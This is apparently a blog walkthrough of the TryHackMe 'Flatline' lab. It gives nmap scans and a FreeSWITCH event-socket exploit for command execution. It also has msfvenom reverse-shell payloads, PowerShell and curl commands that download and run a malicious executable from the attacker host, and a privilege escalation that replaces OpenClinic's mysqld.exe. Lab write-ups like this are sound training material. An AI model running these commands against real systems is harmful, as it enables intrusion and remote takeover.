---
title: Walkthrough - Flatline
published: true
---

Tags: Security, RCE, Broken Permissions.
Description: How low are your morals?
Difficulty: Easy
URL: [https://tryhackme.com/room/flatline](https://tryhackme.com/room/flatline)

* * *

## Notes

- `nmap -Pn -sS -T4 -p- 10.10.71.193 -vvv`

```
PORT     STATE SERVICE       REASON                                                                                          
3389/tcp open  ms-wbt-server syn-ack ttl                                                
8021/tcp open  ftp-proxy     syn-ack ttl 125 
```

- `sudo nmap -sC -sV -Pn -sS -O 10.10.71.193 -p3389,8021`

```
PORT     STATE SERVICE          VERSION
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2022-08-25T13:37:09+00:00
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Not valid before: 2022-08-24T13:29:23
|_Not valid after:  2023-02-23T13:29:23
|_ssl-date: 2022-08-25T13:37:11+00:00; 0s from scanner time.
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
```

searching exploitdb we find a freeswitch exploit that works.

- `python3 freeswitch-exploit.py 10.10.71.193 systeminfo`

Now we can create a payload for the target system `msfvenom -p windows/shell_reverse_tcp LHOST=10.2.127.225 LPORT=6666 -f exe > shell.exe`

- start simple webserver `python3 -m http.server 80` and start listener `rlwrap nc -nvlp 6666`
- upload and start shell `python3 freeswitch-exploit.py 10.10.71.193 "powershell.exe Invoke-WebRequest -Uri http://10.2.127.225/shell.exe -OutFile ./shell.exe && .\shell.exe"`

![0xskar](/assets/flatline01.png)

* * * 

## What is the content of user.txt?

![0xskar](/assets/flatline02.png)

* * * 

## What is the content of root.txt?

We find OpenClinic GA on the system `searchsploit -m windows/local/50448.txt`. This escalation works by letting a low privilege account being able to rename lysqld or tomcat8.exe files located in bin folders and replacing with a malicious file that can connect back to due the service running as local system. we will try replacing the exe here `\mariadb\bin\mysqld.exe`. 

1. Generate malicious .exe on attacking machine
    `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.102 LPORT=4242 -f exe > /var/www/html/mysqld_evil.exe`

2. Setup listener and ensure apache is running on attacking machine
    `nc -lvp 4242`
    

3. Download malicious .exe on victim machine
    type on cmd: `curl http://192.168.1.102/mysqld_evil.exe -o "C:\projects\openclinic\mariadb\bin\mysqld_evil.exe"`

4. Overwrite file and copy malicious .exe.
    `Renename C:\projects\openclinic\mariadb\bin\mysqld.exe > mysqld.bak`
    `Rename downloaded 'mysqld_evil.exe' file in mysqld.exe`

5. Restart service

6. Reverse Shell on attacking machine opens

![0xskar](/assets/flatline03.png)

* * * 

